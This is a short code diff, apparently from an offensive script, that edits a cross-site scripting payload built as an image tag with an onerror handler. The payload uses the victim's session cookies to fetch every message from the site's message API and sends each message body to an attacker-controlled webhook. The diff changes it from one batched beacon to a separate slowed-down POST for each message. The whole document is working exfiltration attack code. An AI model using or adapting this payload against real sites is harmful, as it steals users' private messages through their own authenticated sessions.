@@ -12,17 +12,21 @@
             const payload = `<img src=x onerror="
               async function run() {
                 const WEBHOOK = '${WEBHOOK}';
-
                 const msgs = await fetch('/api/messages', {credentials:'include'}).then(r=>r.json());
-
-                const out = [];
+                
                 for (const m of msgs) {
-                  await new Promise(r => setTimeout(r, 500)); // 500ms between each
+                  await new Promise(r => setTimeout(r, 1000));
                   const body = await fetch('/api/messages/'+m.id, {credentials:'include'}).then(r=>r.json());
-                  out.push(body);
+                  
+                  // One request per message
+                  await fetch(WEBHOOK, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(body)
+                  });
+                  
+                  await new Promise(r => setTimeout(r, 1000));
                 }
-
-                new Image().src = WEBHOOK + '?d=' + encodeURIComponent(JSON.stringify(out));
               }
               run();
             ">`;
